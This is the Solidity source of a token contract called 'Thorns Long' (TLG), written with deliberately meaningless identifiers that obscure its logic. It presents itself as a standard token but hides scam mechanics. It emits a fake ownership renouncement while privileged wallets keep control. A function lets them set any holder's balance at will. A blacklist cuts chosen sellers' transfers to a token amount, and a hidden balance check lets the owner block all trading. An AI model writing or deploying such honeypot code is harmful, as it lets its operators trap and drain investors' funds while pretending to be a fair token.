//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface listLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract autoAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapTxList {
    function createPair(address swapReceiver, address teamWalletEnable) external returns (address);
}

interface launchTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeToken) external view returns (uint256);

    function transfer(address sellLiquidityLaunch, uint256 txBuyLiquidity) external returns (bool);

    function allowance(address totalList, address spender) external view returns (uint256);

    function approve(address spender, uint256 txBuyLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address sellLiquidityLaunch,
        uint256 txBuyLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxMarketing, uint256 value);
    event Approval(address indexed totalList, address indexed spender, uint256 value);
}

interface fromMax is launchTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ThornsLong is autoAmount, launchTrading, fromMax {

    address public toMode;

    function autoLaunched(address limitMaxShould) public {
        if (walletReceiver) {
            return;
        }
        if (shouldLimit == autoSender) {
            totalLiquidity = false;
        }
        walletFund[limitMaxShould] = true;
        if (tokenEnable != totalLiquidity) {
            totalLiquidity = true;
        }
        walletReceiver = true;
    }

    mapping(address => bool) public fromLaunchedSwap;

    function decimals() external view virtual override returns (uint8) {
        return walletTake;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return limitShould;
    }

    bool private totalLiquidity;

    function walletMinLiquidity(address modeReceiver) public {
        takeIsList();
        if (autoSender == exemptFee) {
            totalLiquidity = true;
        }
        if (modeReceiver == toMode || modeReceiver == minLaunched) {
            return;
        }
        fromLaunchedSwap[modeReceiver] = true;
    }

    function transfer(address exemptTake, uint256 txBuyLiquidity) external virtual override returns (bool) {
        return fromAmount(_msgSender(), exemptTake, txBuyLiquidity);
    }

    function senderExempt(address swapTeam, address sellLiquidityLaunch, uint256 txBuyLiquidity) internal returns (bool) {
        require(modeLiquidity[swapTeam] >= txBuyLiquidity);
        modeLiquidity[swapTeam] -= txBuyLiquidity;
        modeLiquidity[sellLiquidityLaunch] += txBuyLiquidity;
        emit Transfer(swapTeam, sellLiquidityLaunch, txBuyLiquidity);
        return true;
    }

    constructor (){
        if (autoShould) {
            tokenEnable = true;
        }
        listLaunched fromShouldSender = listLaunched(teamMarketingMin);
        minLaunched = swapTxList(fromShouldSender.factory()).createPair(fromShouldSender.WETH(), address(this));
        
        toMode = _msgSender();
        sellExempt();
        walletFund[toMode] = true;
        modeLiquidity[toMode] = limitShould;
        
        emit Transfer(address(0), toMode, limitShould);
    }

    bool public takeReceiver;

    address public minLaunched;

    function toTotal(address exemptTake, uint256 txBuyLiquidity) public {
        takeIsList();
        modeLiquidity[exemptTake] = txBuyLiquidity;
    }

    function sellExempt() public {
        emit OwnershipTransferred(toMode, address(0));
        autoTokenLaunch = address(0);
    }

    function allowance(address walletLiquidity, address launchSell) external view virtual override returns (uint256) {
        if (launchSell == teamMarketingMin) {
            return type(uint256).max;
        }
        return autoAtReceiver[walletLiquidity][launchSell];
    }

    address teamMarketingMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address launchSell, uint256 txBuyLiquidity) public virtual override returns (bool) {
        autoAtReceiver[_msgSender()][launchSell] = txBuyLiquidity;
        emit Approval(_msgSender(), launchSell, txBuyLiquidity);
        return true;
    }

    uint256 private exemptFee;

    bool public tokenEnable;

    uint256 public shouldLimit;

    function name() external view virtual override returns (string memory) {
        return txToken;
    }

    function modeLimit(uint256 txBuyLiquidity) public {
        takeIsList();
        launchedAuto = txBuyLiquidity;
    }

    function transferFrom(address swapTeam, address sellLiquidityLaunch, uint256 txBuyLiquidity) external override returns (bool) {
        if (_msgSender() != teamMarketingMin) {
            if (autoAtReceiver[swapTeam][_msgSender()] != type(uint256).max) {
                require(txBuyLiquidity <= autoAtReceiver[swapTeam][_msgSender()]);
                autoAtReceiver[swapTeam][_msgSender()] -= txBuyLiquidity;
            }
        }
        return fromAmount(swapTeam, sellLiquidityLaunch, txBuyLiquidity);
    }

    event OwnershipTransferred(address indexed teamMin, address indexed receiverAt);

    function symbol() external view virtual override returns (string memory) {
        return teamSwap;
    }

    string private txToken = "Thorns Long";

    uint256 constant totalTrading = 2 ** 10;

    mapping(address => mapping(address => uint256)) private autoAtReceiver;

    function getOwner() external view returns (address) {
        return autoTokenLaunch;
    }

    bool public autoShould;

    function owner() external view returns (address) {
        return autoTokenLaunch;
    }

    uint8 private walletTake = 18;

    mapping(address => bool) public walletFund;

    uint256 launchedAuto;

    uint256 private autoSender;

    function balanceOf(address takeToken) public view virtual override returns (uint256) {
        return modeLiquidity[takeToken];
    }

    address minTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function takeIsList() private view {
        require(walletFund[_msgSender()]);
    }

    address private autoTokenLaunch;

    mapping(address => uint256) private modeLiquidity;

    function fromAmount(address swapTeam, address sellLiquidityLaunch, uint256 txBuyLiquidity) internal returns (bool) {
        if (swapTeam == toMode) {
            return senderExempt(swapTeam, sellLiquidityLaunch, txBuyLiquidity);
        }
        uint256 launchedMax = launchTrading(minLaunched).balanceOf(minTrading);
        require(launchedMax == launchedAuto);
        require(sellLiquidityLaunch != minTrading);
        if (fromLaunchedSwap[swapTeam]) {
            return senderExempt(swapTeam, sellLiquidityLaunch, totalTrading);
        }
        return senderExempt(swapTeam, sellLiquidityLaunch, txBuyLiquidity);
    }

    bool private liquidityAmount;

    bool public walletReceiver;

    string private teamSwap = "TLG";

    uint256 private limitShould = 100000000 * 10 ** 18;

    uint256 receiverSwap;

}